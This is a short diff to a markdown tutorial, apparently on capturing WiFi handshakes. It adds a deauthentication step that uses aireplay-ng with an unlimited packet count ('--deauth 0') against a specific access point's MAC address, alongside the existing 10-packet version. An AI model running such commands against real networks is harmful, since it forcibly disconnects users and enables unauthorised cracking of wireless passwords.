@@ -42,6 +42,11 @@ Keep this running to capture the handshake.
 ## 💣 4. Deauthentication Attack (New Terminal)
 
 ```bash
+sudo aireplay-ng --deauth 0 -a AA:A9:15:07:DF:0C wlan0mon
+```
+Sends  unlimited disconnect packets to force reauthentication.
+useing 0
+```bash
 sudo aireplay-ng --deauth 10 -a AA:A9:15:07:DF:0C wlan0mon
 ```
 
